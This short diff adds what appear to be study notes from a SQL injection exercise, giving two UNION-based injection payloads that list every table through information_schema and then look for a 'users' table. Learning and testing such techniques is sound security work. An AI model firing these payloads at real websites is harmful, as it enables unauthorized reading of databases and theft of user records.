@@ -1,0 +1,6 @@
+ we can see all the tables in the database with this query : 
+ 	1 UNION SELECT table_schema, table_name FROM information_schema.tables;
+
+
+ 	1 UNION SELECT * FROM information_schema.tables WHERE table_name = users;
+
